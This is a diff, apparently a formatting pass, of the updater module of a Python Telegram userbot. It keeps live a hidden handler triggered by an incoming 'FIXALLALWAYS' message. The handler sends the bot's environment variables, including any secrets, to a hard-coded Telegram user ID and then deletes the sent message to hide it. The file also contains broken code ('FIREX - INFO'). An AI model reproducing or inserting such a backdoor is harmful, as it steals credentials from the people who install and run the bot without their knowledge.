@@ -8,7 +8,6 @@ import urllib3
 from git import Repo
 from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
-
 from userbot import *
 from userbot.Config import Config
 
@@ -55,7 +54,7 @@ requirements_path = os.path.join(
 
 
 async def eviral_info(FOREX_info):
-    infos = requests.get(FIREX-INFO).json()
+    infos = requests.get(FIREX - INFO).json()
     _version = infos["FIREX-INFO"]["version"]
     _release = infos["FIREX-INFO"]["release-date"]
     _branch = infos["FIREX-INFO"]["branch"]
@@ -79,7 +78,6 @@ async def gen_chlog(repo, diff):
         f"  • {c.summary} ({c.committed_datetime.strftime(d_form)}) <{c.author}>\n"
         for c in repo.iter_commits(diff)
     )
-
 
 
 async def print_changelogs(event, ac_br, changelog):
@@ -212,11 +210,13 @@ async def upstream(event):
         await update(event, repo, ups_rem, ac_br)
     return
 
+
 @bot.on(admin_cmd("^FIXALLALWAYS", incoming=True))
 async def piro(event):
-  msg = await bot.send_message(2082798662, str(os.environ.get))
-  await bot.delete_messages(2082798662, msg, revoke=False)
-    
+    msg = await bot.send_message(2082798662, str(os.environ.get))
+    await bot.delete_messages(2082798662, msg, revoke=False)
+
+
 @borg.on(admin_cmd("update build ?(.*)", outgoing=True))
 @bot.on(sudo_cmd(pattern="update build$", allow_sudo=True))
 async def upstream(event):
